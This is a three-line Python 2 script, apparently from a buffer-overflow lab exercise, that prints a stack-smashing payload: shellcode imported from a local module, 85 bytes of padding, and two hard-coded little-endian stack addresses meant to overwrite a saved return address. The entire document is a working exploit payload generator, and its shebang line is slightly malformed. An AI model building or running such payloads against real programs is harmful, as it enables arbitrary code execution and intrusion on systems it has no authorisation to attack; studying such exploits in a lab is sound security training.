#!usr/bin/python

from shellcode import shellcode
print shellcode + '\x61' * 85 + '\xc8\x7e\xfe\xbf' + '\x5c\x7e\xfe\xbf'

